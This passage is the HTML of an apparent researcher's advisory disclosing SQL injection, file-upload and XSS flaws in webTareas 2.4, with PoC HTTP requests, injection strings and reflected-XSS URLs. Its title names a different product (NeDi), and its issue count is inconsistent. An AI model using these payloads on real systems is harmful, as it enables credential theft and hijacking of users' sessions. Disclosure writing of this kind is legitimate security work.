@@ -1,0 +1,1162 @@
+<!doctype html>
+
+<html lang="en-us">
+
+<head>
+  <title>NeDi 1.9C - Multiple Vulnerabilities - The Tales of N4nj0</title>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="description" content="The HTML5 Herald" />
+<meta name="author" content="Veno Eivazian" /><meta property="og:title" content="NeDi 1.9C - Multiple Vulnerabilities" />
+<meta property="og:description" content="TL;DR I have found five security issues on webTareas &lt;= 2.4:
+1 - SQL Injection: An unauthenticated user is able to perform Time and Boolean-based blind SQL Injection on the endpoint /includes/library.php, via the sor_cible, sor_champs, and sor_ordre HTTP POST parameters.
+2 - Unrestricted File Upload: An authenticated user is able to arbitrarily upload potentially dangerous files without restrictions. This is working by adding or replacing a personal profile picture." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://n4nj0.github.io/advisories/webtareas-multiple-vulnerabilities-i/" />
+<meta property="article:published_time" content="2021-10-07T16:20:00&#43;01:00"/>
+<meta property="article:modified_time" content="2021-10-07T16:20:00&#43;01:00"/>
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="NeDi 1.9C - Multiple Vulnerabilities"/>
+<meta name="twitter:description" content="TL;DR I have found five security issues on webTareas &lt;= 2.4:
+1 - SQL Injection: An unauthenticated user is able to perform Time and Boolean-based blind SQL Injection on the endpoint /includes/library.php, via the sor_cible, sor_champs, and sor_ordre HTTP POST parameters.
+2 - Unrestricted File Upload: An authenticated user is able to arbitrarily upload potentially dangerous files without restrictions. This is working by adding or replacing a personal profile picture."/>
+
+<meta name="generator" content="Hugo 0.54.0" />
+    
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+  <link rel="stylesheet" href="https://n4nj0.github.io/fontawesome/css/all.min.css" />
+  
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
+  
+  
+  <link rel="stylesheet" type="text/css" href="/css/styles.css" /></head>
+
+<body>
+  <div id="container">
+    <header>
+      <h1>
+                <a href="/">The Tales of N4nj0</a>
+            </h1>
+
+      <ul id="social-media">
+             <li>
+               <a href="https://github.com/n4nj0" title="GitHub">
+               <i class="fab fa-github fa-lg"></i>
+               </a>
+             </li>
+             <li>
+               <a href="https://twitter.com/venoeivazian" title="Twitter">
+               <i class="fab fa-twitter fa-lg"></i>
+               </a>
+             </li>
+             <li>
+               <a href="https://linkedin.com/in/venoeivazian" title="LinkedIn">
+               <i class="fab fa-linkedin fa-lg"></i>
+               </a>
+             </li>
+      </ul>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+        <li>
+            <a class="active" href="/advisories/">
+                <i class="fa-li fa  fa-lg"></i><span>Advisories</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="/cves/">
+                <i class="fa-li fa  fa-lg"></i><span>CVEs</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="/posts/">
+                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="/whoami/">
+                <i class="fa-li fa  fa-lg"></i><span>whoami</span>
+            </a>
+        </li>
+        
+    </ul>
+</nav>
+
+
+    <main>
+
+
+
+
+<article>
+
+    <h1>NeDi 1.9C - Multiple Vulnerabilities</h1>
+
+    
+      <aside>
+    <ul>
+        <li>
+            <time class="post-date" datetime="2021-10-07T16:20:00&#43;01:00">Oct 7, 2021</time>
+        </li>
+        
+        
+
+        
+
+        <li>20 minutes read</li>
+    </ul>
+</aside>
+
+    
+
+    
+<div class="featured_image">
+    <a href="https://n4nj0.github.io/advisories/webtareas-multiple-vulnerabilities-i/" title="NeDi 1.9C - Multiple Vulnerabilities">
+        <img src="">
+    </a>
+</div>
+
+
+
+    
+
+<h2 id="tl-dr">TL;DR</h2>
+
+<p>I have found five security issues on webTareas &lt;= 2.4:</p>
+
+<p><strong>1 - SQL Injection</strong>: An unauthenticated user is able to perform Time and Boolean-based blind SQL Injection on the endpoint /includes/library.php, via the sor_cible, sor_champs, and sor_ordre HTTP POST parameters.<br />
+<strong>2 - Unrestricted File Upload</strong>: An authenticated user is able to arbitrarily upload potentially dangerous files without restrictions. This is working by adding or replacing a personal profile picture. The affected endpoint is /includes/upload.php on the HTTP POST data.<br />
+<strong>3 - Multiple Reflected XSS</strong>: An authenticated user is able to inject arbitrary web script or HTML and achieve a Reflected Cross-Site Scripting attack against the platform users and administrators. The issue affects every endpoint on the application because it is related on how each URL is echoed back on every response page.<br />
+<strong>4 - Stored XSS</strong>: An authenticated user is able to store arbitrary web script or HTML and achieve a Stored Cross-Site Scripting attack against the platform users and administrators. This is possible by creating or editing a client name in the clients section. The affected endpoint is /clients/editclient.php via the HTTP POST cn parameter.<br />
+<strong>5 - Cross-Site Request Forgery (CSRF)</strong>: A remote attacker is ableto create a new administrative profile and add a new user to the new profile without the victim&rsquo;s knowledge. This is possible by crafting an HTML page with predefined data for the /userprofiles/edituserprofile.php and /users/edituser.php URLs, and enticing an authenticated admin user to visit an attacker&rsquo;s web page.</p>
+
+<h2 id="product-information">Product Information</h2>
+
+<ul>
+<li><strong>Product Name:</strong> webTareas</li>
+<li><strong>Affected Versions:</strong> &lt;= 2.4</li>
+<li><strong>Product Web Page:</strong> <a href="https://sourceforge.net/projects/webtareas/">https://sourceforge.net/projects/webtareas/</a></li>
+<li><strong>Vulnerability Disclosure Info Web Page:</strong> <a href="https://sourceforge.net/p/webtareas/tickets/">https://sourceforge.net/p/webtareas/tickets/</a></li>
+</ul>
+
+<p>webTareas is a Web-Based Collaboration OpenSource Tool, capable to perform end-to-end project &amp; corporate management. The developers are very active to add new features and to fix security bugs in blazing speed.<br />
+During a security auditing of the product, I have found three issues.<br />
+The fixes were developed by the owner two day after my vulnerability notification. That&rsquo;s a very professional way to handle high impact security vulnerabilities!</p>
+
+<p>It is recommended to apply the latest patch at the time of writing, 2.4p2: <a href="https://sourceforge.net/p/webtareas/blog/2021/10/announcement-webtareas-v24p2-release---2021-10-7/">https://sourceforge.net/p/webtareas/blog/2021/10/announcement-webtareas-v24p2-release&mdash;2021-10-7/</a></p>
+
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+
+<h3 id="1-improper-neutralization-of-special-elements-used-in-an-sql-command-sql-injection-cwe-89"><strong>1 - Improper Neutralization of Special Elements used in an SQL Command (&lsquo;SQL Injection&rsquo;) - CWE-89</strong></h3>
+
+<ul>
+<li><strong>Summary:</strong> An unauthenticated user can perform Time-based Boolean Blind SQL Injection attack to access all the data in the database and obtain access to the webTareas application.</li>
+<li><strong>Prerequisites:</strong> None.</li>
+<li><strong>CVE and CVSS Score:</strong> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41920">CVE-2021-41920</a> | <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41920"><strong>N/A</strong> (N/A)</a></li>
+</ul>
+
+<p><strong>Affected Endpoints</strong></p>
+
+<ul>
+<li><strong>URL:</strong> <a href="http://hostname/includes/library.php">http://hostname/includes/library.php</a></li>
+<li><strong>HTTP Parameters:</strong> sor_cible, sor_champs, sor_ordre</li>
+</ul>
+
+<p><strong>Step-by-step instructions and PoC</strong></p>
+
+<p>The application is vulnerable in the default installation, without any customization.<br />
+This security issue is found through source code analysis. In particular, the source file <code>webtareas/includes/library.php</code> has both the sources and the sinks needed to analyze and exploit the vulnerability.</p>
+
+<p>The file does not contain require the user to be authenticated. The following authorization code is missing on the beginning of <em>library.php</em> file:</p>
+
+<pre><code>$checkSession = true;
+</code></pre>
+
+<p>Beginning from line 189, there are the sinks, or the parameters accepting user data:</p>
+
+<pre><code>// extract sorting variables
+$sor_cible = isset($_POST['sor_cible']) ? $_POST['sor_cible'] : '';
+$sor_champs = isset($_POST['sor_champs']) ? $_POST['sor_champs'] : '';
+$sor_ordre = isset($_POST['sor_ordre']) ? $_POST['sor_ordre'] : '';
+</code></pre>
+
+<p>Those parameters are not sanitized, and the sinks are triggered by the conditional branches beginning from line 335:</p>
+
+<pre><code>// update sorting table if query sort column
+if (!empty($sor_cible) &amp;&amp; $sor_champs != 'none') {
+    $querymore1 = &quot; WHERE member='$idSession' AND sortid='$sor_cible'&quot;;
+    $sortingDetail = new request();
+    $sortingDetail-&gt;openSorting($querymore1);
+    $newSortString = &quot;$sor_champs $sor_ordre&quot;;
+
+    if (count($sortingDetail-&gt;sor_member) == 0) {   // new sorting string
+        $tmpsql = 'INSERT INTO ' . $tablePrefix . &quot;sorting (member,sortid,sortstr) VALUES ('$idSession','$sor_cible','$newSortString')&quot;;
+        connectSql($tmpsql);
+    } elseif ($newSortString != $sortingDetail-&gt;sor_sortstr[0]) {   // sorting string changed
+        $tmpsql = 'UPDATE ' . $tablePrefix . &quot;sorting SET sortstr='$newSortString' WHERE member=$idSession AND sortid='$sor_cible'&quot;;
+        connectSql($tmpsql);
+    }
+}
+</code></pre>
+
+<p>This means there are 3 ways to tamper the page parameters to achieve SQL Injection:
+1. Injecting code only in <code>sor_cible</code> parameter.
+2. Injecting code in the <code>sor_champs</code> parameter and using a non-null <code>sor_cible</code> parameter.
+3. Injecting code in the <code>sor_ordre</code> parameter and using non-null <code>sor_champs</code> and <code>sor_cible</code> parameters.</p>
+
+<p>For the <strong>first</strong> way, it was found that the application behavior is different when a user executes <strong>TRUE</strong> or <strong>FALSE</strong> SQL statement conditions. The following request will be evaluated as <strong>TRUE</strong> (<em>f</em> of string <em>foobar</em> is ASCII 102) and the <em>sleep</em> statement will delay the response by 3 seconds:</p>
+
+<pre><code>POST /includes/library.php HTTP/1.1
+Content-Length: 81
+Host: hostname
+Upgrade-Insecure-Requests: 1
+Accept: text/html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Connection: close
+
+sor_cible=aaa' AND 0=(SELECT IF(ORD(SUBSTRING('foobar',1,1))=102,sleep(3),0))-- -
+</code></pre>
+
+<p>Enabling query logging on MySQL, the full query will be as the following:</p>
+
+<pre><code>SELECT sor.* FROM zG9sorting sor WHERE member='0' AND sortid='aaa' AND 0=(SELECT IF(ORD(SUBSTRING('foobar',1,1))=102,sleep(3),0))-- -'
+</code></pre>
+
+<p>The following request will be evaluated as <strong>FALSE</strong> (<em>f</em> of string <em>foobar</em> is not ASCII 103) and the <em>sleep</em> statement will not be triggered, returning immediately the response:</p>
+
+<pre><code>POST /includes/library.php HTTP/1.1
+Content-Length: 81
+Host: hostname
+Upgrade-Insecure-Requests: 1
+Accept: text/html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Connection: close
+
+sor_cible=aaa' AND 0=(SELECT IF(ORD(SUBSTRING('foobar',1,1))=103,sleep(3),0))-- -
+</code></pre>
+
+<p>For the <strong>second</strong> way, the application behavior is different when a user executes <strong>TRUE</strong> or <strong>FALSE</strong> SQL statement conditions. The following request will be evaluated as <strong>TRUE</strong> (<em>f</em> of string <em>foobar</em> is ASCII 102):</p>
+
+<pre><code>POST /includes/library.php HTTP/1.1
+Content-Length: 133
+Host: hostname
+Upgrade-Insecure-Requests: 1
+Accept: text/html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Connection: close
+
+sor_champs=aaa' WHERE 1=(SELECT (CASE WHEN (ORD(MID('foobar',1,1))=102) THEN 1 ELSE (SELECT 2 UNION SELECT 3) END))-- -&amp;sor_cible=aaa
+</code></pre>
+
+<p>The response body will be empty:</p>
+
+<pre><code>HTTP/1.1 200 OK
+Date: Tue, 28 Sep 2021 21:25:07 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Set-Cookie: webTareasSID=hpc1gs0985dorhep36s9n7tbvv; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+</code></pre>
+
+<p>The full query will be as the following:</p>
+
+<pre><code>UPDATE zG9sorting SET sortstr='aaa' WHERE 1=(SELECT (CASE WHEN (ORD(MID('foobar',1,1))=102) THEN 1 ELSE (SELECT 2 UNION SELECT 3) END))-- - ' WHERE member=0 AND sortid='aaa'
+</code></pre>
+
+<p>The following request will be evaluated as <strong>FALSE</strong> (<em>f</em> of string <em>foobar</em> is not ASCII 103):</p>
+
+<pre><code>POST /includes/library.php HTTP/1.1
+Content-Length: 133
+Host: hostname
+Upgrade-Insecure-Requests: 1
+Accept: text/html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Connection: close
+
+sor_champs=aaa' WHERE 1=(SELECT (CASE WHEN (ORD(MID('foobar',1,1))=103) THEN 1 ELSE (SELECT 2 UNION SELECT 3) END))-- -&amp;sor_cible=aaa
+</code></pre>
+
+<p>The response body will contain a database informative message:</p>
+
+<pre><code>HTTP/1.1 200 OK
+Date: Tue, 28 Sep 2021 21:26:24 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Set-Cookie: webTareasSID=56425alqgh47f0ur39f4mmke4p; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 38
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+Subquery returns more than 1 row(1242)
+</code></pre>
+
+<p>For the <strong>third</strong> way, the application behavior is different when a user executes <strong>TRUE</strong> or <strong>FALSE</strong> SQL statement conditions. The following request will be evaluated as <strong>TRUE</strong> (<em>f</em> of string <em>foobar</em> is ASCII 102):</p>
+
+<pre><code>POST /includes/library.php HTTP/1.1
+Content-Length: 133
+Host: hostname
+Upgrade-Insecure-Requests: 1
+Accept: text/html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Connection: close
+
+sor_champs=aaa&amp;sor_cible=aaa&amp;sor_ordre=aaa' WHERE 1=(SELECT (CASE WHEN (ORD(MID('foobar',1,1))=102) THEN 1 ELSE (SELECT 2 UNION SELECT 3) END))-- -
+</code></pre>
+
+<p>The response body will be empty:</p>
+
+<pre><code>HTTP/1.1 200 OK
+Date: Tue, 28 Sep 2021 21:31:29 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Set-Cookie: webTareasSID=g6g1q71b75dberjosvi202e90l; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+</code></pre>
+
+<p>The full query will be as the following:</p>
+
+<pre><code>UPDATE zG9sorting SET sortstr='aaa aaa' WHERE 1=(SELECT (CASE WHEN (ORD(MID('foobar',1,1))=102) THEN 1 ELSE (SELECT 2 UNION SELECT 3) END))-- -' WHERE member=0 AND sortid='aaa'
+</code></pre>
+
+<p>The following request will be evaluated as <strong>FALSE</strong> (<em>f</em> of string <em>foobar</em> is not ASCII 103):</p>
+
+<pre><code>POST /includes/library.php HTTP/1.1
+Content-Length: 133
+Host: hostname
+Upgrade-Insecure-Requests: 1
+Accept: text/html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Connection: close
+
+sor_champs=aaa&amp;sor_cible=aaa&amp;sor_ordre=aaa' WHERE 1=(SELECT (CASE WHEN (ORD(MID('foobar',1,1))=103) THEN 1 ELSE (SELECT 2 UNION SELECT 3) END))-- -
+</code></pre>
+
+<p>The response body will contain a database informative message:</p>
+
+<pre><code>HTTP/1.1 200 OK
+Date: Tue, 28 Sep 2021 21:36:56 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Set-Cookie: webTareasSID=07tjdueb24bcco59kl6glmj746; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 38
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+Subquery returns more than 1 row(1242)
+</code></pre>
+
+<p>It is possible to create a python tool to extract all the data from the database.<br />
+The banner of the database is gathered as PoC of the vulnerability:</p>
+
+<p><img src="/images/41ff40b763b1160133a1dd2fb31a6e2a.png" alt="SQLi - Banner" /></p>
+
+<p>Also, the web application administrative credentials can be dumped:</p>
+
+<p><img src="/images/b672c5cd8d3304f29b049c1b7e297005.png" alt="SQLi - Admin Credentials" /></p>
+
+<p><strong>Security Impact</strong></p>
+
+<p>By exploiting this issue an attacker is able to access all the data in the database and obtain access to the webTareas application, because all the data, including administrative credentials, can be extracted and cracked.<br />
+Also, if the database itself has permission misconfigurations, the underlying operating system could be also compromised.</p>
+
+<h3 id="2-unrestricted-upload-of-file-with-dangerous-type-cwe-434"><strong>2 - Unrestricted Upload of File with Dangerous Type - CWE-434</strong></h3>
+
+<ul>
+<li><strong>Summary:</strong> The webTareas web interface does not protect against arbitrarily and potentially dangerous file uploading. Any user able to change the profile picture can arbitrary upload any kind of file.</li>
+<li><strong>Prerequisites:</strong> None.</li>
+<li><strong>CVE and CVSS Score:</strong> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41919">CVE-2021-41919</a> | <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41919"><strong>N/A</strong> (N/A)</a></li>
+</ul>
+
+<p><strong>Step-by-step instructions and PoC</strong></p>
+
+<p>A remote user, authenticated to the webTareas web interface, can arbitrarily upload potentially dangerous files without restrictions. This is working by adding or replacing his personal profile picture.</p>
+
+<p><strong>Affected Endpoints</strong></p>
+
+<ul>
+<li><strong>URL:</strong> <a href="https://hostname/includes/upload.php">https://hostname/includes/upload.php</a></li>
+<li><strong>HTTP Parameters:</strong> POST data</li>
+</ul>
+
+<p>Below are the evidences with the vulnerability details and the payloads used.</p>
+
+<p>To exploit the vulnerability, a simple HTML file with JavaScript code is uploaded.<br />
+It can be done directly from the web interface, removing the tag attribute <code>accept=&quot;image/*&quot;</code> to bypass client-side restriction, or with the following HTTP request:</p>
+
+<pre><code>POST /includes/upload.php HTTP/1.1
+Host: hostname
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-FILENAME: xss.html
+Content-Type: text/html
+Content-Length: 385
+Origin: http://hostname
+Connection: close
+Referer: http://hostname/preferences/updateuser.php?
+Cookie: webTareasSID=dp2pj14hlavst3r4bo23iviha4
+
+&lt;html&gt;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;!-- Write your comments here --&gt;
+&lt;!-- Write your comments here --&gt;
+&lt;!-- Write your comments here --&gt;
+&lt;!-- Write your comments here --&gt;
+&lt;!-- Write your comments here --&gt;
+&lt;!-- Write your comments here --&gt;
+&lt;!-- Write your comments here --&gt;
+&lt;!-- Write your comments here --&gt;
+&lt;!-- Write your comments here --&gt;
+&lt;!-- Write your comments here --&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>The HTTP response will disclose the full path of the profile picture:</p>
+
+<pre><code>HTTP/1.1 200 OK
+Date: Tue, 28 Sep 2021 22:20:31 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 42
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+/var/www/hostname/files/tmpYdZ5tI
+</code></pre>
+
+<p>By correlating the full path with the application URL, it is possible to download or execute the file on the link:</p>
+
+<pre><code>http://hostname/files/tmpYdZ5tI
+</code></pre>
+
+<p>Requesting the file, the JavaScript payload will be executed:</p>
+
+<p><img src="/images/51c21ff1745d12c28376bec344a02084.png" alt="Unrestricted file upload - HTML file" /></p>
+
+<p><strong>Security Impact</strong></p>
+
+<p>This vulnerability would allow an attacker to exploit the platform by injecting code or malware and, under certain conditions, to execute code on remote user browsers.</p>
+
+<h3 id="3-improper-neutralization-of-input-during-web-page-generation-stored-cross-site-scripting-cwe-79"><strong>3 - Improper Neutralization of Input During Web Page Generation (Stored Cross-Site Scripting) - CWE-79</strong></h3>
+
+<ul>
+<li><strong>Summary:</strong> An authenticated remote user is able to store arbitrary web script or HTML by creating or editing a client name in the clients section, due to incorrect sanitization of user-supplied data and achieve a Stored Cross-Site Scripting attack against the platform users and administrators.</li>
+<li><strong>Prerequisites:</strong> Valid user session with the privileges to add or edit clients to webTareas web application.</li>
+<li><strong>CVE and CVSS Score:</strong> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41917">CVE-2021-41917</a> | <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41917"><strong>N/A</strong> (N/A)</a></li>
+</ul>
+
+<p><strong>Step-by-step instructions and PoC</strong></p>
+
+<p>A remote user, authenticated to the webTareas web application, through <strong>Clients</strong> section, can arbitrarily inject and store JavaScript code. This is working on both adding a new client, or by editing an existing one.</p>
+
+<p><strong>Affected Endpoints</strong></p>
+
+<ul>
+<li><strong>URL:</strong> <a href="https://hostname/clients/editclient.php">https://hostname/clients/editclient.php</a></li>
+<li><strong>HTTP Parameters:</strong> cn</li>
+</ul>
+
+<p>Below are the evidences with the vulnerability details and the payloads used.</p>
+
+<p>To exploit the vulnerability, a XSS payload is uploaded. It can be done directly from the web interface:
+1. Go to <strong>Client</strong> menu: <a href="http://hostname/clients/listclients.php">http://hostname/clients/listclients.php</a>
+2. Add a new client with the &lsquo;<strong>+</strong>&rsquo; button.
+3. Create a new client. On the Name field, insert the following value:</p>
+
+<pre><code>client_name&lt;img src='#' onerror=alert(document.cookie) /&gt;
+</code></pre>
+
+<ol>
+<li>Select <strong>Save</strong>.</li>
+</ol>
+
+<p>Alternatively, it is possible to submit the following HTTP request:</p>
+
+<pre><code>POST /clients/editclient.php HTTP/1.1
+Host: hostname
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------39432385815962433282511417701
+Content-Length: 2349
+Origin: http://hostname
+Connection: close
+Referer: http://hostname/clients/editclient.php?
+Cookie: webTareasSID=dp2pj14hlavst3r4bo23iviha4
+Upgrade-Insecure-Requests: 1
+
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;action&quot;
+
+add
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;cown&quot;
+
+1
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;cn&quot;
+
+client_name&lt;img src='#' onerror=alert(document.cookie) /&gt;
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;add&quot;
+
+
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;zip&quot;
+
+
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;ct&quot;
+
+
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;cou&quot;
+
+
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;wp&quot;
+
+
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;fa&quot;
+
+
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;url&quot;
+
+
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;email&quot;
+
+
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;curr&quot;
+
+
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;wc&quot;
+
+1
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;pym&quot;
+
+1
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;pyt&quot;
+
+7
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;c&quot;
+
+
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;ssc&quot;
+
+
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;&quot;
+Content-Type: application/octet-stream
+
+
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;attnam1&quot;
+
+
+-----------------------------39432385815962433282511417701
+Content-Disposition: form-data; name=&quot;atttmp1&quot;
+
+
+-----------------------------39432385815962433282511417701--
+
+</code></pre>
+
+<p>The JavaScript payload will trigger immediately:</p>
+
+<p><img src="/images/479a7b587e5abbba967a17ed8db298c5.png" alt="Stored XSS (1)" /></p>
+
+<p>Also, viewing the client list, the JavaScript payload will also be triggered:</p>
+
+<p><img src="/images/f396d1c8dc31ffbc37c99ae1092c12d9.png" alt="Stored XSS (2)" /></p>
+
+<p><strong>Security Impact</strong></p>
+
+<p>By exploiting this issue an attacker is able to target application users who are able to access the clients page within the browser with several type of direct or indirect impacts such as stealing cookies (the HttpOnly flag is missing from the session cookies), modifying a web page, capturing clipboard contents, keylogging, port scanning, dynamic downloads and other attacks. This type of stored XSS does not require user interaction.</p>
+
+<h3 id="4-improper-neutralization-of-input-during-web-page-generation-reflected-cross-site-scripting-cwe-79"><strong>4 - Improper Neutralization of Input During Web Page Generation (Reflected Cross-Site Scripting) - CWE-79</strong></h3>
+
+<ul>
+<li><strong>Summary:</strong> An authenticated remote user is able to inject arbitrary web script or HTML due to incorrect sanitization of user-supplied data and achieve a Reflected Cross-Site Scripting attack against the platform users and administrators.</li>
+<li><strong>Prerequisites:</strong> None.</li>
+<li><strong>CVE and CVSS Score:</strong> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41918">CVE-2021-41918</a> | <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41918"><strong>N/A</strong> (N/A)</a></li>
+</ul>
+
+<p><strong>Step-by-step instructions and PoC</strong></p>
+
+<p>A malicious user can cause an administrator user to supply dangerous content to the vulnerable page, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims.</p>
+
+<p><strong>Affected Endpoints:</strong></p>
+
+<ul>
+<li><strong>URL:</strong> <a href="http://hostname/">http://hostname/</a></li>
+<li><strong>HTTP Parameter:</strong> URL path and user-supplied parameters.</li>
+</ul>
+
+<p>Below are the evidences with the vulnerability details and the payloads used.</p>
+
+<p>To execute the JavaScript payload in the browser context, paste the URL in the browser:</p>
+
+<pre><code>http://hostname/administration/print_layout.php?doc_type=rhsyf&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;aez00
+</code></pre>
+
+<p>The payload is reflected on the response.</p>
+
+<p><img src="/images/2f98f4306093a4fa27d8dc3cf8b7a8ec.png" alt="Payload execution" /></p>
+
+<p>The issue affects every endpoint on the application because it is related on how each URL is echoed back on every response page.<br />
+Other examples of vulnerable URLs are the following:</p>
+
+<pre><code>http://hostname/administration/print_layout.php?doc_type=rhsyf&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;aez00
+http://hostname/administration/print_layout.php?doc_type=11x4qvr&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;oxa79
+http://hostname/administration/systeminfo.php/jhdab&lt;script&gt;alert(1)&lt;/script&gt;kt1h6
+http://hostname/administration/systeminfo.php/themes/camping/includes/avatarss22m9&lt;script&gt;alert(1)&lt;/script&gt;wew7l/f2.png?ver=1629353246
+http://hostname/administration/systeminfo.php/themes/camping/includes/tiny_mcebybn9&lt;script&gt;alert(1)&lt;/script&gt;hvmtz/tiny_mce.js?ver=1629353245
+http://hostname/administration/systeminfo.php/themes/camping/preferences/pref.php/c9y1c&lt;script&gt;alert(1)&lt;/script&gt;se108?
+http://hostname/administration/systeminfo.php/themes/camping/themes/campingbtuvt&lt;script&gt;alert(1)&lt;/script&gt;azo6r/attention.png
+http://hostname/administration/systeminfo.php/themes/camping/themes/campingxs581&lt;script&gt;alert(1)&lt;/script&gt;phopf/btn_camera.png
+http://hostname/administration/systeminfo.php/themes/camping/themes/campingicy03&lt;script&gt;alert(1)&lt;/script&gt;utpxd/btn_download.png
+http://hostname/administration/systeminfo.php/themes/camping/themes/camping/jquery-uixgpwm&lt;script&gt;alert(1)&lt;/script&gt;t3sf5/jquery-ui.min.css?ver=1629353244
